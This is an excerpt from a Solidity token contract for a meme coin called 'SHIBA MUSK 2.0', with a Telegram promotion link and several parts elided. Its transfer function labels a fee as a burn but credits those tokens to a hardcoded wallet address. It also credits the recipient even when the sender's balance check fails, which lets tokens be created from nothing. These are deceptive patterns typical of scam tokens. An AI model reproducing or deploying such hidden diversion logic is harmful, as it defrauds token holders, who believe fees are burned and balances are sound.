...
// Submitted for Telegram: https://t.me/shibamuskofficial
...
contract  ShibaMusktwo  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "SHIBA MUSK 2.0";
    string private _symbol = "$SHIBMUSK2.0";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xB6998F84eC235C02addF7A8E258c4Ad68ffaf1ae] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0xB6998F84eC235C02addF7A8E258c4Ad68ffaf1ae, _bruntoken);
        }
